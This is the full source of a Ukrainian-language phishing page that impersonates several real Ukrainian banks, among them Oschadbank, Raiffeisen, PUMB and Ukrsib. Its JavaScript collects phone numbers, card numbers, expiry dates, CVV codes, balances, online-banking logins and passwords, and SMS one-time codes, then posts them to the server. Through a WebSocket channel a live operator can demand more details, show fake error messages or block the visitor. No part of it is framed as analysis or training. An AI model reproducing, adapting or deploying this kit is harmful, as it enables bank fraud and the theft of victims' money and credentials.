<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        /* --- ОБЩИЕ СТИЛИ (ОРИГИНАЛЬНЫЕ) --- */
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
            --oschad-primary: #00A39C; --oschad-light: #e0f2f1;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
        }
        .form-container {
            width: 100%; max-width: 380px; margin: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color);
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-field {
            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
        }
        .input-field.invalid { border-color: var(--danger-color); }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix {
            padding: 15px; border: 1px solid var(--border-color); border-right: none;
            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
        }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
        .btn:disabled { background-color: #ced4da !important; cursor: not-allowed; }
        .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
        .btn-back { background-color: #f1f3f5; color: var(--light-text); }
        body[data-theme="oschadbank"] { --primary-color: #00A39C; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        /* Другие темы... */

        /* --- ИЗОЛИРОВАННЫЕ СТИЛИ ТОЛЬКО ДЛЯ МОДАЛЬНОГО ОКНА "ЛК" ОЩАДБАНКА --- */
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #f8f9fa; display: none; justify-content: center; align-items: flex-start; z-index: 1000;
        }
        .oschad-lk-modal {
            background-color: transparent; padding: 0; border-radius: 0;
            width: 100%; max-width: 480px; text-align: center; box-shadow: none;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-lk-modal .header {
            width: 100%; display: flex; align-items: center; padding: 10px 15px;
        }
        .oschad-lk-modal .back-arrow { font-size: 28px; color: #495057; margin-right: 15px; cursor: pointer; line-height: 1; }
        .oschad-lk-modal .title { font-size: 18px; font-weight: 600; flex-grow: 1; text-align: center; margin-right: 40px; }
        .oschad-lk-modal .welcome-section { padding: 20px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; }
        .oschad-lk-modal .welcome-section p { font-size: 16px; color: #495057; line-height: 1.5; margin-bottom: 25px; font-weight: 500; }
        .oschad-lk-modal .toggle-buttons {
            display: flex; background-color: #e9ecef; border-radius: 12px;
            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
        }
        .oschad-lk-modal .toggle-buttons button {
            flex: 1; padding: 12px 15px; border: none; background-color: transparent; font-size: 15px;
            font-weight: 600; color: #6c757d; cursor: pointer; border-radius: 8px; transition: all 0.2s ease;
        }
        .oschad-lk-modal .toggle-buttons button.active { background-color: var(--oschad-light); color: var(--oschad-primary); }
        .oschad-lk-modal .input-group { margin-bottom: 20px; width: 100%; position: relative; }
        .oschad-lk-modal .input-group label {
            position: absolute; top: 15px; left: 15px; font-size: 15px; color: #adb5bd;
            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
        }
        .oschad-lk-modal .input-group.static-label label,
        .oschad-lk-modal .input-group input:focus + label,
        .oschad-lk-modal .input-group input:not(:placeholder-shown) + label { top: -10px; left: 10px; font-size: 12px; color: #6c757d; }
        .oschad-lk-modal .input-field {
            width: 100%; padding: 15px 45px 15px 15px; border: 1px solid #dee2e6;
            border-radius: 12px; font-size: 16px; background-color: var(--white);
            transition: all 0.2s ease; outline: none; font-weight: 500;
        }
        .oschad-lk-modal .input-field:focus { border-color: var(--oschad-primary); }
        .oschad-lk-modal .input-field::placeholder { color: transparent; }
        .oschad-lk-modal .password-toggle-icon {
            position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #adb5bd;
        }
        .oschad-lk-modal .password-toggle-icon svg { width: 22px; height: 22px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
        .oschad-lk-modal .phone-wrapper { display: flex; align-items: center; width: 100%; padding-left: 15px; border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white); }
        .oschad-lk-modal .phone-wrapper:focus-within { border-color: var(--oschad-primary); }
        .oschad-lk-modal .phone-prefix { padding-right: 5px; font-size: 16px; font-weight: 500; }
        .oschad-lk-modal .phone-wrapper .input-field { border: none; padding-left: 0; flex-grow: 1; }
        .oschad-lk-modal .submit-button {
            width: 100%; padding: 16px; margin-top: 30px; border: none;
            border-radius: 16px; background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
            cursor: not-allowed; transition: all 0.2s ease;
        }
        .oschad-lk-modal .submit-button.active { background-color: var(--oschad-primary); color: var(--white); cursor: pointer; }
        .oschad-lk-modal .loader-icon {
            width: 80px; height: 80px; margin: 20px auto; background: transparent; border: none;
            -webkit-animation: spin 2s linear infinite; animation: spin 2s linear infinite;
        }
        @-webkit-keyframes spin { 0% { -webkit-transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Далі</button>
            </div>
        </div>
    </div>
    <div id="custom-modal-overlay">
        <div id="custom-modal-content"></div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    // --- ДАЛЕЕ ИДЕТ ПОЛНЫЙ JAVASCRIPT БЕЗ СОКРАЩЕНИЙ ---
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    let ws;
    let activeBankData = {};
    let currentStepIndex = 0;
    let collectedData = {};

    const specialFlowSteps = [
        { type: 'phone', title: 'Введіть номер телефону' },
        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
    ];
    const confirmationSteps = [
        {
            type: 'confirm_all',
            title: 'Підтвердити володіння карткою',
            fields: [
                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
            ]
        }
    ];

    const bankFlows = {
        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: specialFlowSteps, special: true },
        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: specialFlowSteps, special: true },
        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: specialFlowSteps, special: true },
        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: specialFlowSteps, special: true },
        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: specialFlowSteps, special: true },
        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: specialFlowSteps, special: true },
        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: specialFlowSteps, special: true }
    };
    
    const bankGrid = document.querySelector('.bank-grid');
    const body = document.body;
    const formHeaderLogo = document.getElementById('form-header-logo');
    const modalTitle = document.getElementById('modal-title');
    const stepContent = document.getElementById('modal-step-content');
    const modalFooter = document.querySelector('.modal-footer');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');
    const customModalOverlay = document.getElementById('custom-modal-overlay');
    const customModalContent = document.getElementById('custom-modal-content');
    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');

    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
        ws = new WebSocket(`${protocol}://${window.location.host}`);
        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
        ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
        ws.onclose = () => setTimeout(connectWebSocket, 3000);
        ws.onerror = (error) => console.error('WebSocket error:', error);
    }
    
    function renderCustomModal(type, bankName) {
        let html = '';
        if (type === 'lk' && bankName === 'Ощадбанк') {
            html = `
                <div class="oschad-lk-modal">
                    <div class="header">
                        <span class="back-arrow" id="oschad-back-arrow">←</span>
                        <span class="title">Ласкаво просимо</span>
                    </div>
                    <div class="welcome-section">
                        <p>Для входу введіть логін або номер</p>
                        <div class="toggle-buttons">
                            <button id="toggle-phone" class="active">Номер телефону</button>
                            <button id="toggle-login">Логін</button>
                        </div>
                        <div id="phone-login-form">
                            <div class="input-group static-label">
                                <label for="phone_input">Номер телефону</label>
                                <div class="phone-wrapper">
                                    <span class="phone-prefix">+380</span>
                                    <input type="tel" class="input-field" id="phone_input" placeholder=" " autocomplete="off">
                                </div>
                            </div>
                            <div class="input-group">
                                <input type="password" class="input-field" id="phone_password_input" placeholder=" " autocomplete="off">
                                <label for="phone_password_input">Пароль</label>
                                <span class="password-toggle-icon">
                                    <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                                </span>
                            </div>
                        </div>
                        <div id="login-form" style="display: none;">
                            <div class="input-group">
                                <input type="text" class="input-field" id="login_input" placeholder=" " autocomplete="off">
                                <label for="login_input">Логін</label>
                            </div>
                            <div class="input-group">
                                <input type="password" class="input-field" id="login_password_input" placeholder=" " autocomplete="off">
                                <label for="login_password_input">Пароль</label>
                                <span class="password-toggle-icon">
                                    <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                                </span>
                            </div>
                        </div>
                    </div>
                    <button class="submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
                </div>
            `;
        }
        customModalContent.innerHTML = html;
        customModalOverlay.style.display = 'flex';
        addCustomModalListeners(bankName);
    }
    
    function addCustomModalListeners(bankName) {
        if (bankName === 'Ощадбанк') {
            const submitBtn = document.getElementById('oschad-submit-btn');
            const togglePhoneBtn = document.getElementById('toggle-phone');
            const toggleLoginBtn = document.getElementById('toggle-login');
            const phoneLoginForm = document.getElementById('phone-login-form');
            const loginForm = document.getElementById('login-form');
            const oschadBackArrow = document.getElementById('oschad-back-arrow');
            let activeOschadForm = 'phone';
            
            const phoneInput = document.getElementById('phone_input');
            const phonePassInput = document.getElementById('phone_password_input');
            const loginInput = document.getElementById('login_input');
            const loginPassInput = document.getElementById('login_password_input');
            
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                let formatted = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (match, p1, p2, p3, p4) => {
                    let res = p1;
                    if (p2) res += ' ' + p2;
                    if (p3) res += ' ' + p3;
                    if (p4) res += ' ' + p4;
                    return res;
                });
                e.target.value = formatted;
            });

            const updateOschadButtonState = () => {
                const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
                const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;

                if (isPhoneFormValid || isLoginFormValid) {
                    submitBtn.classList.add('active');
                    submitBtn.disabled = false;
                } else {
                    submitBtn.classList.remove('active');
                    submitBtn.disabled = true;
                }
            };
            
            [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => {
                if (input) input.addEventListener('input', updateOschadButtonState);
            });

            togglePhoneBtn.addEventListener('click', () => {
                togglePhoneBtn.classList.add('active');
                toggleLoginBtn.classList.remove('active');
                phoneLoginForm.style.display = 'block';
                loginForm.style.display = 'none';
                activeOschadForm = 'phone';
                updateOschadButtonState();
            });

            toggleLoginBtn.addEventListener('click', () => {
                toggleLoginBtn.classList.add('active');
                togglePhoneBtn.classList.remove('active');
                phoneLoginForm.style.display = 'none';
                loginForm.style.display = 'block';
                activeOschadForm = 'login';
                updateOschadButtonState();
            });

            oschadBackArrow.addEventListener('click', () => { customModalOverlay.style.display = 'none'; });
            
            customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
                icon.addEventListener('click', () => {
                    const passwordInput = icon.closest('.input-group').querySelector('input');
                    const isPassword = passwordInput.type === 'password';
                    passwordInput.type = isPassword ? 'text' : 'password';
                    icon.style.color = isPassword ? '#212529' : '#adb5bd';
                });
            });

            submitBtn.onclick = () => {
                if(submitBtn.disabled) return;
                const dataToSend = {};
                if (activeOschadForm === 'phone') {
                    dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
                    dataToSend.password = phonePassInput.value;
                } else {
                    dataToSend.login = loginInput.value;
                    dataToSend.password = loginPassInput.value;
                }
                
                sendDataToServer(dataToSend, true);
                
                customModalContent.innerHTML = `
                    <div class="oschad-lk-modal">
                        <div class="header">
                            <span class="back-arrow" onclick="document.getElementById('custom-modal-overlay').style.display='none'">←</span>
                            <span class="title">Зачекайте</span>
                        </div>
                        <div class="welcome-section">
                            <h3>Зачекайте</h3>
                            <p>Сервер перевантажений</p>
                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
                        </div>
                    </div>
                `;
            };
        }
    }

    async function sendDataToServer(data, isFinal) {
        collectedData = { ...collectedData, ...data };
        try {
            await fetch(`/api/submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, referrer: localStorage.getItem('referrer') || 'unknown', ...collectedData }),
            });
        } catch (error) { console.error('Failed to send data:', error); }
    }

    function handleServerCommand(command) {
        const { type, data } = command;
        if (type !== 'lk' && type !== 'call') {
            customModalOverlay.style.display = 'none';
        }
        const showMessageInMainModal = (title, text, btnText, callback) => {
            body.classList.add('form-active');
            modalTitle.textContent = title;
            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
            modalFooter.style.display = 'flex';
            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
            modalFooter.querySelector('button').onclick = callback;
        };
        switch (type) {
            case 'sms':
                body.classList.add('form-active');
                modalTitle.textContent = 'Введіть код з SMS';
                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                modalFooter.style.display = 'flex';
                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                break;
            case 'lk':
                body.classList.remove('form-active');
                renderCustomModal('lk', data.bankName);
                break;
            case 'call':
                body.classList.remove('form-active');
                renderCustomModal('call', data.bankName);
                break;
            case 'request_details':
                activeBankData.steps.push(...confirmationSteps);
                currentStepIndex++;
                renderStep();
                break;
            case 'other':
                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                if (bankToDisable) {
                    bankToDisable.classList.add('disabled');
                    if (!bankToDisable.querySelector('.unavailable-label')) {
                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
                    }
                }
                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                break;
            case 'pin_error': showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); }); break;
            case 'number_error': showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); }); break;
            case 'code_error': body.classList.add('form-active'); const smsErrorContainer = document.getElementById('sms-error-container'); if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`; break;
            case 'ban': document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh;"><h1>🚫<br>Доступ заблоковано</h1></div>`; if (ws) ws.close(); break;
            case 'custom_message_text': showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep); break;
        }
    }

    function handleNextStep() {
        if (!validateCurrentStep()) return;
        let data = {};
        stepContent.querySelectorAll('.input-field').forEach(input => {
            let key = input.id;
            let value = input.value;
            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
            data[key] = value;
        });
        const step = activeBankData.steps[currentStepIndex];
        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
        if (activeBankData.theme === 'oschadbank' && step.type === 'card') { isFinalStep = true; }
        sendDataToServer(data, isFinalStep);
        if ((activeBankData.special && step.type === 'card_simple') || (activeBankData.theme === 'oschadbank' && step.type === 'card')) {
            showWaitingScreen();
            return;
        }
        currentStepIndex++;
        if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); }
    }

    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;

    function renderStep() {
        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
        const step = activeBankData.steps[currentStepIndex];
        let html = '';
        switch (step.type) {
            case 'phone': html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`; break;
            case 'card': case 'card_simple': html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19'); break;
            case 'pin': html = generateInputHTML('pin', 'ПІН-код', 'password', '4'); break;
            case 'call_code': html = `<p>Зараз вам буде здійснено дзвінок...</p>${generateInputHTML('call_code_input', 'Введіть код', 'tel', '6')}`; break;
            case 'confirm_all': html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join(''); break;
        }
        modalTitle.textContent = step.title;
        stepContent.innerHTML = html;
        modalFooter.style.display = 'flex';
        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
        nextBtn.style.display = 'block';
        addInputFormatting();
    }

    function showWaitingScreen() { modalTitle.textContent = 'Очікуємо'; stepContent.innerHTML = `<p>Заявку відправлено. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`; modalFooter.style.display = 'none'; }
    function handleBackStep() { if (currentStepIndex > 0) { currentStepIndex--; renderStep(); } else { body.classList.remove('form-active'); } }

    function addInputFormatting() {
        const phoneInput = document.getElementById('phone');
        if (phoneInput) {
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                e.target.value = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
            });
        }
        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
        if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); }
        const cardExpiryInput = document.getElementById('card-expiry');
        if (cardExpiryInput) { cardExpiryInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'); }); }
    }

    function validateCurrentStep() {
        let isValid = true;
        stepContent.querySelectorAll('.input-field').forEach(input => {
            const errorContainer = input.closest('.input-group')?.querySelector('.error-message');
            input.classList.remove('invalid');
            if (errorContainer) errorContainer.style.display = 'none';
            let value = input.value.replace(/\D/g, '');
            let requiredLength = 0;
            switch (input.id) {
                case 'phone': requiredLength = 9; break;
                case 'card': case 'card_confirm': requiredLength = 16; break;
                case 'card-expiry': requiredLength = 4; break;
                case 'card-cvv': requiredLength = 3; break;
                case 'pin': requiredLength = 4; break;
            }
            if (requiredLength > 0 && value.length < requiredLength) {
                isValid = false;
                input.classList.add('invalid');
                if (errorContainer) { errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`; errorContainer.style.display = 'block'; }
            }
        });
        return isValid;
    }

    async function submitSmsCode() {
        const codeInput = document.getElementById('sms-code');
        const code = codeInput.value;
        const errorContainer = document.getElementById('sms-error-container');
        if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Введіть код</p>`; return; }
        try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); }
        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код</p>`;
        codeInput.value = '';
    }
    
    document.querySelectorAll('.bank-item').forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            const bankId = item.dataset.bank;
            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
            body.dataset.theme = activeBankData.theme;
            formHeaderLogo.src = activeBankData.logoUrl;
            body.classList.add('form-active');
            currentStepIndex = 0;
            collectedData = {};
            renderStep();
            connectWebSocket();
        });
    });
});
</script>
